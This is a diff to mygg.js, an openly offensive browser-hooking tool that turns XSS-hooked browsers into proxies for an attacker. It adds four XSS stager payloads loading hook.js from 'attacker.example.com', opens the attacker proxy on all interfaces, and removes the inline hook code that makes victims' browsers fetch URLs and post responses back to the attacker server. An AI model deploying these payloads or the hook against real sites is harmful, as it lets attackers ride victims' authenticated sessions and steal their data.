@@ -1,36 +1,28 @@
 /* --------- Info --------- */
 
-//  mygg.js v0.3.3.1
-//  Author: Daniel Solstad
-//  Repository: https://github.com/dsolstad/mygg.js
-
+//  mygg.js v0.4.0
+//  Author: Daniel Solstad (https://github.com/dsolstad/mygg.js)
+//  Forked by: Daniel Antonsen (https://github.com/root4loot/mygg.js)
 
 /* --------- Configuration --------- */
 
-// The only thing you really need to change is the domain parameter.
-// If you don't have a domain, change domain to the ipaddr of the server hosting mygg.js.
-// If mygg is running on a remote server, either leave proxy_interface at 127.0.0.1 and use ssh+portforwarding,
-// or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips. 
-
 const config = {
-    domain: 'example.com',
-    http_interface: '0.0.0.0',
+    domain: process.env.DOMAIN || 'attacker.example.com',
     https_interface: '0.0.0.0',
-    http_port: 80,
-    https_port: 443,
+    https_port: 8443,
     polling_time: 2000,
     key: './key.pem',
     cert: './cert.pem',
     debug: 0,
-    proxy_interface: '127.0.0.1',
+    proxy_interface: '0.0.0.0',
     proxy_port: 8081,
     proxy_allowed_ips: ['127.0.0.1'],
 }
 
 /* --------- Requires --------- */
 
-const http = require('http');
 const https = require('https');
+const http = require('http');
 const proxy = require('http');
 const fs = require('fs');
 const util = require('util');
@@ -57,13 +49,6 @@ proxy.createServer(function (req, res) {
 
     console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
     console.log(`[+] Requesting: ${req.method} ${req.url}`);
-    
-    /* Get the full requested URL. */
-    /*var urlObj = new URL(req.url);
-    var url = urlObj.pathname;
-    if (urlObj.searchParams != '') {
-        url = url + '?' + urlObj.searchParams;
-    }*/
     
     /* Check if request from proxy/attacker contains a body. */
     if (req.headers['content-length'] > 0) {
@@ -98,17 +83,17 @@ proxy.createServer(function (req, res) {
                 var body_length = body.length;
                 var headers = updateContentLength(headers, body_length);
 
-		        console.log("[+] Received status: " + result.status);
-		        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
-		        if (config.debug) { console.log("[+] Received body:\n" + body); }
-		        console.log("[+] -------------------------------- [+]");
+                console.log("[+] Received status: " + result.status);
+                if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+                if (config.debug) { console.log("[+] Received body:\n" + body); }
+                console.log("[+] -------------------------------- [+]");
 
                 // Need to convert status code to a valid one.
-				if (result.status == '0') { 
-					res.writeHead(404);
-			    } else {
-		        	res.writeHead(result.status, headers);
-		        }
+                if (result.status == '0') { 
+                    res.writeHead(404);
+                } else {
+                    res.writeHead(result.status, headers);
+                }
                 res.end(body);
             };
         });
@@ -159,7 +144,7 @@ proxy.createServer(function (req, res) {
 });
 
 
-/* --------- HTTP and HTTPS server for serving hook.js, polling and receiving requests --------- */
+/* --------- HTTPS server for serving hook.js, polling and receiving requests --------- */
 
 http_handler = function(req, res) {
     var ipaddr = req.connection.remoteAddress;
@@ -167,9 +152,16 @@ http_handler = function(req, res) {
     var referer = req.headers['referer'];
     /* Serves the hook file */
     if (req.url == '/hook.js') {
-        res.writeHead(200, {"Content-Type": "application/javascript"});
-        res.end(hook_file);
-        console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
+        fs.readFile('hook.js', function(err, data) {
+            if (err) {
+                res.writeHead(404);
+                res.end();
+                return;
+            }
+            res.writeHead(200, {"Content-Type": "application/javascript"});
+            res.end(data);
+            console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
+        });
     /* Hooked browser asks mygg if there are any new jobs for it */
     } else if (req.url == '/polling') {
         res.setHeader('Access-Control-Allow-Origin', '*');
@@ -227,13 +219,6 @@ http_handler = function(req, res) {
     }
 };
 
-/* Start HTTP Server */
-http.createServer(http_handler).listen(config.http_port, config.http_interface, function(err) {
-    if (err) return console.error(err)
-    var info = this.address()
-    console.log(`[+] HTTP server listening on address ${info.address} port ${info.port}`)
-});
-
 /* Generate key and self-signed certificate. */
 const shell = spawn('openssl', 'req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=localhost'.split(" "));
 
@@ -288,84 +273,17 @@ function str2json(headers) {
     return header_map;
 }
 
-
 /* --------- Payload stager that downloads mygg --------- */
 
-var hook = `<svg/onload="var x=document.createElement('script');\
-x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`
-console.log("[+] Payload stager:\r\n" + hook + "\r\n");
+const payloads = [
+    `<script>var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);</script>`,
+    `<img src=x onerror="var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`,
+    `<iframe src="javascript:var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);"></iframe>`,
+    `<svg/onload="var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`
+];
 
-
-/* --------- The mygg.js payload --------- */
-
-var hook_file = `
-function makeRequest(id, method, url, head, body) {
-    /* Forcing the hooked browser to perform the request. */
-    var target_http = new XMLHttpRequest();
-    target_http.responseType = 'blob';
-    target_http.onreadystatechange = function() {
-
-        /* Sending the response back to mygg. */
-        if (target_http.readyState == 4) {
-            var formData = new FormData();
-            formData.append('id', id);
-            formData.append('method', method);
-            formData.append('url', url);
-
-            /* Ugly hack for old browser's that doesn't support responseURL */
-            responseURL = (target_http.responseURL? target_http.responseURL : url);
-
-            /* Checking if the browser got a redirect. */
-            if (stripProt(url) == stripProt(responseURL)) {
-                formData.append('status', target_http.status);
-                formData.append('headers', target_http.getAllResponseHeaders());
-                var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
-                formData.append('body', blob);
-            } else {
-                /* Need to redirect the attacking browser too. */
-                formData.append('status', '301');
-                formData.append('headers', "Location: " + target_http.responseURL);
-            }
-            var mygg_http = new XMLHttpRequest();
-            mygg_http.open("POST", "//${config.domain}:" + getPort() + "/responses", true);
-            mygg_http.send(formData);
-        }
-    };
-    
-    target_http.open(method, url, true);
-    //for (var key in head) { target_http.setRequestHeader(key, head[key]) }
-    if (body) {
-        // Need to add some headers sent from the attacking browser
-        target_http.setRequestHeader('content-type', head['content-type']);
-        target_http.send(body.trim());
-    } else {
-        target_http.send();
-    }
-}
-function stripProt(url) {
-    return url.split('://').splice(1).join('/');
-}
-function getPath(url) {
-    return '/' + url.split('/').splice(3).join('/');
-}
-function getPort() {
-    var ports = {'http': ${config.http_port}, 'https': ${config.https_port}};
-    return ports[location.protocol.slice(0, -1)];
-}
-function poll() {
-    var mygg_http = new XMLHttpRequest();
-    mygg_http.onreadystatechange = function () {
-        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
-            var tasks = JSON.parse(mygg_http.responseText);
-            for (var i in tasks){
-                console.log("New task"); console.log(tasks[i]);
-                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].headers, tasks[i].body);
-            }
-        }
-    };
-    mygg_http.open("GET", "//${config.domain}:" + getPort() + "/polling", true);
-    mygg_http.send();
-    setTimeout(poll, ${config.polling_time});
-}
-poll();
-`;
+console.log("[+] Payload stager examples:");
+payloads.forEach((hook, index) => {
+    console.log(`[+] Example payload ${index + 1}:`);
+    console.log(hook + "\n");
+});
